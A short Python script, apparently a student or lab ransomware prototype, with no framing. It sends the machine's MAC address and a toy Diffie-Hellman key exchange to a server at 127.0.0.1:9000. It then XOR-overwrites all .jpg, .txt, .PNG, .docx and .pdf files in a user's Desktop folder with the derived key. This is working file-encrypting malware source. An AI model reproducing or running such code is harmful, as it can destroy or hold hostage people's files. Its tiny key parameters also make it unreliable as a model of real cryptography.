import os
import requests
import re, uuid

url='http://127.0.0.1:9000'
x=''
mac_id=''.join(re.findall('..', '%012x' % uuid.getnode()))
directory='C:/Users/teama/Desktop/NW/files'
def encrypt(key):
    for filename in os.listdir(directory):
        if filename.endswith(".jpg") or filename.endswith(".txt") or  filename.endswith(".PNG") or filename.endswith(".docx") or filename.endswith(".pdf") :
            f=os.path.join(directory, filename)
            file= open(f,"rb")
            read_file=file.read()
            read_bytes=bytearray(read_file)
            print(len(read_bytes))
            print(os.path.join(directory, filename))
            print("FILE ENCRYPTED...")

            for index,value in enumerate(read_bytes):
                read_bytes[index]=value^key

            file.close()

            file=open(f,"wb")
            file.write(read_bytes)
            file.close()
        else:
            continue





def keyShare(root,n,privateKey,url,mac_id):
    mc=(root**privateKey)%n
    client_data={'client_msg':mc,'root':root,'n':n,'mac_id':mac_id}
    x=requests.post(url,data=client_data)
    ms=int(x.text)
    print('Server ',ms)
    commonKey=(ms**privateKey)%n
    print('Common Key',commonKey)
    return commonKey





key=keyShare(5,23,4,url,mac_id)

print('Encrypting in process....')
encrypt(key)
